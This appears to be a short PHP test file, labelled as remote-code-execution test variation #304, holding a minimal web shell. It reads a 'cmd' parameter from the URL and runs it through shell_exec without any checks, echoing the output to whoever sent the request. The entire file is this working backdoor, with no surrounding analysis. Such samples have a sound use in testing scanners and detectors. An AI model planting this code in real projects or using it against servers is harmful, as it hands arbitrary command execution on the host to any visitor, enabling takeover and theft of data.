<?php
// RCE test variation #304
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>